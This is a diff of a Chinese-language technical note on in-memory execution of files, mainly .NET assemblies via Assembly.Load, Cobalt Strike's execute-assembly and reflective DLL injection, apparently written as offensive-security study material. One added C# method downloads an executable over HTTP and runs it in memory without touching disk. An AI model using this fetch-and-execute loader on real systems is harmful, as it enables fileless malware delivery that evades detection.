@@ -1,5 +1,7 @@
 # 内存加载执行文件的方法
 
+
+
 分两部分：
 
 * .NET程序集
@@ -7,7 +9,7 @@
 
 ## 0. 执行本地文件
 
-此处以C#和C++为例：AI都会写
+此处以C# C++ Java为例：AI都会写
 
 ### exe
 
@@ -56,6 +58,26 @@ int main()
 
     return 0;
 }
+```
+
+Java
+
+```java
+public void exeExecute(String filePath) {
+
+        try {
+            // 创建进程
+            ProcessBuilder processBuilder = new ProcessBuilder(filePath);
+            processBuilder.redirectErrorStream(true); // 合并错误流
+            Process process = processBuilder.start();
+
+            // 等待进程结束
+            int exitCode = process.waitFor();
+            System.out.println("Exited with code: " + exitCode);
+        } catch (IOException | InterruptedException e) {
+            e.printStackTrace();
+        }
+    }
 ```
 
 
@@ -112,6 +134,10 @@ int main()
 }
 ```
 
+Java调用第三方dll有点困难，需要dll的源码中实现了JNI方法，此处就不写了。
+
+
+
 
 
 ## 1. managed代码内存加载.NET程序集
@@ -120,7 +146,11 @@ int main()
 
 使用C#从内存中加载.NET程序集，直接用`Assembly.Load`就行了。
 
-[Assembly.Load Method (System.Reflection) | Microsoft Learn](https://learn.microsoft.com/en-us/dotnet/api/system.reflection.assembly.load?view=netframework-4.5)
+> [从内存加载.NET程序集(Assembly.Load)的利用分析](https://3gstudent.github.io/%E4%BB%8E%E5%86%85%E5%AD%98%E5%8A%A0%E8%BD%BD.NET%E7%A8%8B%E5%BA%8F%E9%9B%86(Assembly.Load)%E7%9A%84%E5%88%A9%E7%94%A8%E5%88%86%E6%9E%90)
+>
+> [Assembly.Load Method (System.Reflection) | Microsoft Learn](https://learn.microsoft.com/en-us/dotnet/api/system.reflection.assembly.load?view=netframework-4.5)
+
+
 
 ### 1.1. 三种Load的区别
 
@@ -133,8 +163,6 @@ int main()
 * `Assembly.LoadFile()`也是从指定文件中加载程序集，但不会加载目标程序集所引用和依赖的其他程序集，例如：`Assembly.LoadFile("a.dll")`，如果a.dll中引用了b.dll，那么不会加载b.dll
 
 ### 1.2. C#反射加载流程
-
-**(1) 编写测试程序**
 
 测试程序的代码如下：
 
@@ -169,7 +197,9 @@ C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe /out:testcalc.exe test.c
 
 生成testcalc.exe
 
-**(2) 测试的.exe作base64编码**
+#### 方法1
+
+**（1）测试的.exe作base64编码**
 
 代码如下：
 
@@ -191,7 +221,7 @@ namespace TestApplication
 }
 ```
 
-**(3) 还原.exe的内容**
+**（2）还原.exe的内容**
 
 ```csharp
 using System;
@@ -210,7 +240,7 @@ namespace TestApplication
 
 
 
-**(4) 使用Assembly.Load()加载程序集并调用方法**
+**（3）使用Assembly.Load()加载程序集并调用方法**
 
 代码如下：
 
@@ -252,48 +282,56 @@ namespace TestApplication
             string base64str = "xxxxxx"; //此处省略一万字
             byte[] buffer = Convert.FromBase64String(base64str);
 
+            // 这里的Assembly.Load可以读取字符串形式的程序集，也就是说exe文件不需要写入硬盘
             Assembly assembly = Assembly.Load(buffer);
+            // 以exe为例，如果是dll文件就必须指定类名函数名
             MethodInfo method = assembly.EntryPoint;
+            method.Invoke(null, null);
             // 想要指定参数
-            object[] parameters = new[] {"-a","-b"};
-            method.Invoke(null, parameters);
+            // object[] parameters = new[] {"-a","-b"};
+            // method.Invoke(null, parameters);
         }
     }
 }
 ```
 
-### 1.3. 示例代码
+#### 方法2
 
-#### c#
+远程下载
 
 ```csharp
-using System;
-using System.IO;
-using System.Reflection;
-
-namespace MemoryLoadApplication
-{
-
-    class Program
+	public class remote
     {
-
-        static void Main(string[] args)
+        public static void MemoryExecutor()
         {
+            // 方法1. 把exe文件给base64编码，然后保存在一个常量里, 转成byte数组，放到Assembly.Load函数里
+            // string base64String = Constants.Base64Exe;
+            // byte[] buffer = Convert.FromBase64String(base64String);
 
-            byte[] buffer = File.ReadAllBytes(@"C:\Users\Black Sheep\source\repos\Seatbelt\Seatbelt\bin\Release\Seatbelt.exe");
-            string base64str = Convert.ToBase64String(buffer);
-            string dir = Directory.GetCurrentDirectory();
-            buffer = Convert.FromBase64String(base64str);
-            File.WriteAllText($"{dir}\\base64.txt", base64str);
-            Assembly assembly = System.Reflection.Assembly.Load(buffer);
-            assembly.EntryPoint.Invoke(null, new object[] { args });
-
+            // 方法2. 远程下载exe，赋值给一个字符串类型的变量
+            byte[] buffer = GetRemoteByte("http://127.0.0.1:8000/testcalc.exe");
+            
+            Assembly assembly = Assembly.Load(buffer);
+            MethodInfo method = assembly.EntryPoint;
+            method.Invoke(null, null);
         }
+        
+        
+        private static byte[] GetRemoteByte(string serviceUrl)
+        {
+            WebClient client = new WebClient();
+            byte[] buffer = client.DownloadData(serviceUrl);
+            return buffer;
+        }
+        
     }
-}
 ```
 
-#### powershell
+
+
+### 1.3. powershell
+
+> https://idiotc4t.com/code-and-dll-process-injection/.net-fan-she-jia-zai
 
 powershell访问.net程序集的代码比较简单
 
@@ -367,7 +405,7 @@ CLR是.NET Framework的主要执行引擎，作用之一是监视程序的运行
 
 [![image-20220114182256752](img/PELoader/image-20220114182256752.png)](https://0pen1.github.io/2022/02/09/net程序集内存加载执行技术/net程序集内存加载执行技术.assets/image-20220114182256752.png)
 
-接下来进入spawn方法，可以看到是**通过反射DLL的方法，将invokeassembly.dll注入到进程当中**（这块也不知道咋实现的），并且设置任务号为70（x86版本）或者71（x64）。注入的invokeassembly.dll在其内存中创建CLR环境，然后通过管道再将C#可执行文件读取到内存中,最后执行。
+接下来进入spawn方法，可以看到是**通过反射DLL的方法，将invokeassembly.dll注入到进程当中**（这块还没自己实现过），并且设置任务号为70（x86版本）或者71（x64）。注入的invokeassembly.dll在其内存中创建CLR环境，然后通过管道再将C#可执行文件读取到内存中,最后执行。
 
 ```java
 public void spawn(String var1) {
@@ -480,6 +518,8 @@ namespace TEST
 ```
 
 ### 2.4. 内存加载执行.NET程序集
+
+> 
 
 1.初始化CLR环境(同上)
 
